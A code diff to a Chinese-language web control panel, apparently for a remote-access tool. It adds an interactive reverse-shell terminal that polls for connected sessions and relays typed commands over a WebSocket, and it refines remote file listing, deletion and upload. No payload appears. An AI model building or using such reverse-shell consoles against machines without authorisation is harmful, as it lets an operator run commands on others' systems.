@@ -165,7 +165,15 @@
                             <button class="btn btn-danger" onclick="startReverseShell()">启动反弹Shell</button>
                             <div class="result-output" style="margin-top: 20px;">
                                 <p>反弹Shell状态: <span id="reverseShellStatus">未启动</span></p>
+                                <p>会话ID: <span id="reverseShellSessionId">无</span></p>
                                 <p>请在您的监听器上查看连接。</p>
+                            </div>
+                            <div class="shell-terminal" style="margin-top: 20px; background-color: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 5px; font-family: monospace; height: 300px; overflow-y: scroll;">
+                                <pre id="shellOutput"></pre>
+                            </div>
+                            <div class="shell-input-area" style="display: flex; margin-top: 10px;">
+                                <input type="text" id="shellInput" class="command-input" placeholder="输入Shell命令..." style="flex-grow: 1; margin-right: 10px;" disabled />
+                                <button class="btn btn-primary" id="sendShellCommand" onclick="sendShellCommand()" disabled>发送</button>
                             </div>
                         </div>
                     </div>
@@ -293,6 +301,8 @@
             }
         }
 
+        let shellWebSocket = null; // 全局WebSocket实例
+
         async function startReverseShell() {
             if (confirm('确定要启动反弹Shell吗？')) {
                 try {
@@ -306,16 +316,109 @@
                     });
 
                     if (response.ok) {
+                        const data = await response.json();
+                        
                         alert('反弹Shell请求已发送');
-                        document.getElementById('reverseShellStatus').textContent = '请求已发送，请检查您的监听器';
+                        document.getElementById('reverseShellStatus').textContent = '请求已发送，正在等待连接...';
+                        document.getElementById('reverseShellSessionId').textContent = '等待连接';
+                        
+                        // 等待一段时间让客户端建立连接，然后获取连接列表
+                        setTimeout(async () => {
+                            await checkForReverseShellConnections();
+                        }, 3000); // 等待3秒
+
                     } else {
                         alert('发送反弹Shell请求失败');
                         document.getElementById('reverseShellStatus').textContent = '启动失败';
+                        document.getElementById('reverseShellSessionId').textContent = '无';
                     }
                 } catch (error) {
                     alert('发送请求时出错: ' + error.message);
                     document.getElementById('reverseShellStatus').textContent = '启动失败: ' + error.message;
+                    document.getElementById('reverseShellSessionId').textContent = '无';
                 }
+            }
+        }
+
+        async function checkForReverseShellConnections() {
+            try {
+                const response = await fetch('/api/reverse_shells', {
+                    method: 'GET',
+                    credentials: 'same-origin'
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.connections && data.connections.length > 0) {
+                        // 使用最新的连接
+                        const connectionId = data.connections[data.connections.length - 1];
+                        document.getElementById('reverseShellSessionId').textContent = connectionId;
+                        
+                        // 建立WebSocket连接
+                        connectWebSocket(connectionId);
+                    } else {
+                        document.getElementById('reverseShellStatus').textContent = '等待连接建立...';
+                        // 继续轮询
+                        setTimeout(async () => {
+                            await checkForReverseShellConnections();
+                        }, 2000);
+                    }
+                } else {
+                    document.getElementById('reverseShellStatus').textContent = '获取连接列表失败';
+                }
+            } catch (error) {
+                console.error('检查连接失败:', error);
+                document.getElementById('reverseShellStatus').textContent = '检查连接失败';
+            }
+        }
+
+        function connectWebSocket(connectionId) {
+            if (shellWebSocket) {
+                shellWebSocket.close();
+            }
+
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}/ws/shell/${connectionId}`;
+            shellWebSocket = new WebSocket(wsUrl);
+
+            const shellOutput = document.getElementById('shellOutput');
+            const shellInput = document.getElementById('shellInput');
+            const sendButton = document.getElementById('sendShellCommand');
+
+            shellWebSocket.onopen = () => {
+                document.getElementById('reverseShellStatus').textContent = '已连接';
+                shellInput.disabled = false;
+                sendButton.disabled = false;
+                shellOutput.textContent = '连接成功，等待Shell输出...\n';
+                shellInput.focus();
+            };
+
+            shellWebSocket.onmessage = (event) => {
+                shellOutput.textContent += event.data;
+                shellOutput.scrollTop = shellOutput.scrollHeight; // 滚动到底部
+            };
+
+            shellWebSocket.onclose = () => {
+                document.getElementById('reverseShellStatus').textContent = '已断开';
+                shellInput.disabled = true;
+                sendButton.disabled = true;
+                shellOutput.textContent += '\nShell连接已断开。';
+            };
+
+            shellWebSocket.onerror = (error) => {
+                console.error('WebSocket Error:', error);
+                document.getElementById('reverseShellStatus').textContent = '连接错误';
+                shellOutput.textContent += `\n连接错误: ${error.message || '未知错误'}`;
+            };
+        }
+
+        function sendShellCommand() {
+            const command = document.getElementById('shellInput').value;
+            if (shellWebSocket && shellWebSocket.readyState === WebSocket.OPEN) {
+                shellWebSocket.send(command + '\n'); // 发送命令，加上换行符
+                document.getElementById('shellInput').value = ''; // 清空输入框
+            } else {
+                alert('Shell未连接或连接已关闭。');
             }
         }
 
@@ -341,35 +444,22 @@
         // 文件管理功能
         let currentPath = '/';
         
-        function renderFileList(data) {
+        function renderFileList(serverResponse) {
             const fileList = document.getElementById('fileList');
             fileList.innerHTML = '';
 
-            console.log('Rendering file list with data:', data);
+            console.log('Rendering file list with server response:', serverResponse);
 
-            // Handle different response formats
+            // Extract entries from the server response
             let entries = [];
-
-            if (data && typeof data === 'object') {
-                if (Array.isArray(data)) {
-                    entries = data;
-                } else if (data.entries && Array.isArray(data.entries)) {
-                    entries = data.entries;
-                } else if (data.data) {
-                    if (Array.isArray(data.data)) {
-                        entries = data.data;
-                    } else if (data.data.entries && Array.isArray(data.data.entries)) {
-                        entries = data.data.entries;
-                    } else if (typeof data.data === 'object' && data.data.entries) {
-                        entries = data.data.entries;
-                    }
-                }
+            if (serverResponse && serverResponse.data && serverResponse.data.entries) {
+                entries = serverResponse.data.entries;
             }
 
             console.log('Extracted entries:', entries);
 
             if (!Array.isArray(entries) || entries.length === 0) {
-                fileList.innerHTML = '<tr><td colspan="7" class="no-results">目录为空或数据格式错误</td></tr>';
+                fileList.innerHTML = '<tr><td colspan="7" class="no-results">目录为空</td></tr>';
                 return;
             }
 
@@ -559,7 +649,7 @@
                     } catch (e) {
                         alert(`获取文件列表失败: HTTP ${response.status}`);
                     }
-                    document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">网络错误</td></tr>';
+                    document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">获取文件列表失败</td></tr>';
                 }
             } catch (error) {
                 console.error('Error fetching file list:', error);
@@ -621,11 +711,21 @@
                 });
                 
                 if (response.ok) {
-                    alert('删除成功');
-                    listDirectory(); // 刷新文件列表
+                    const result = await response.json();
+                    if (result.success) {
+                        alert('删除成功');
+                        listDirectory(); // 刷新文件列表
+                    } else {
+                        alert(`删除失败: ${result.message}`);
+                    }
                 } else {
-                    const error = await response.json();
-                    alert(`删除失败: ${error.message}`);
+                    const errorText = await response.text();
+                    try {
+                        const error = JSON.parse(errorText);
+                        alert(`删除失败: ${error.message || 'Unknown error'}`);
+                    } catch (e) {
+                        alert(`删除失败: HTTP ${response.status}`);
+                    }
                 }
             } catch (error) {
                 alert('删除时出错: ' + error.message);
@@ -652,12 +752,23 @@
                 });
                 
                 if (response.ok) {
-                    alert('文件上传成功');
-                    fileInput.value = ''; // 清空文件输入
-                    listDirectory(); // 刷新文件列表
+                    const result = await response.json();
+                    if (result.success) {
+                        alert('文件上传成功');
+                        fileInput.value = ''; // 清空文件输入
+                        document.getElementById('fileNameDisplay').textContent = '未选择任何文件';
+                        listDirectory(); // 刷新文件列表
+                    } else {
+                        alert(`上传失败: ${result.message}`);
+                    }
                 } else {
-                    const error = await response.json();
-                    alert(`上传失败: ${error.message}`);
+                    const errorText = await response.text();
+                    try {
+                        const error = JSON.parse(errorText);
+                        alert(`上传失败: ${error.message || 'Unknown error'}`);
+                    } catch (e) {
+                        alert(`上传失败: HTTP ${response.status}`);
+                    }
                 }
             } catch (error) {
                 alert('上传时出错: ' + error.message);
